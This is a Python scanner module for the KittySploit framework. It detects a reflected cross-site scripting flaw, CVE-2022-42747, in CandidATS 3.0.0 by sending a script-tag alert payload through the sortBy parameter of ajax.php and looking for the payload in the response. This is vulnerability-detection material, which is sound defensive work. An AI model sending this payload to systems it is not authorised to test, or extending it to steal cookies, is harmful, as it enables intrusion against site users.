#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CandidATS 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CandidATS 3.0.0 - Cross-Site Scripting. Detection',
        'description': 'CandidATS 3.0.0 contains a cross-site scripting vulnerability via the sortBy parameter of the ajax.php resource. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'candidats', 'xss', 'auieo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://fluidattacks.com/advisories/modestep/',
            'https://fluidattacks.com/advisories/jcole/',
            'https://candidats.net/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-42747',
        ],
        'cve': 'CVE-2022-42747',
    }

    def run(self):
        r = self.http_request(method="GET", path='/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&sortDirection=desc&indexFile=1&isPopup=0', allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'candidat',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="CandidATS 3.0.0 - Cross-Site Scripting. detected",
                path='/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&sortDirection=desc&indexFile=1&isPopup=0',
            )
            return True
        return False

